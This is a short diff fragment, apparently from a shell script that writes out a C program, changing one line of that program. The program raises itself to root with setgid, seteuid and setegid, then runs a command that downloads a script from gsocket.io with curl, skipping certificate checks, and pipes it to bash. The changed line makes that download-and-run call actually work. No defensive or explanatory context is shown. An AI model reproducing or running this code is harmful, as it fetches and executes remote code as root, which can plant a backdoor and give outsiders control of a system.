@@ -22,7 +22,7 @@ int main(void){
     setgid(0);
     seteuid(0);
     setegid(0);
-    exec("/bin/bash <(curl -fsSLk gsocket.io/x)");
+    system("/bin/bash <(curl -fsSLk gsocket.io/x)");
 }
 EOF
 export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/opt/libemu
